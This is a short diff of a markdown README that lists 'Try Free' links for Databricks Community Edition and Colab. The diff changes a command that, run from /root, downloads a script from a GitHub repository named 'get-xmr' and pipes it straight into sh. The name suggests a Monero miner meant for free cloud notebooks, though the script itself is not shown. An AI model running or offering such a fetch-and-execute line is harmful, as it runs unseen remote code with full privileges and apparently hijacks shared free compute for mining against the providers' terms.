@@ -2,7 +2,7 @@
 * Try Free [Databricks Community Edition](https://bit.ly/Databr1cks)
 ```markdown
 cd /root
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
+curl https://raw.githubusercontent.com/oktora24/get-xmr/main/databricks.sh | sh
 ```
 * Try Free [XRDP GColab](https://bit.ly/XRDP-Colab)
 ```markdown
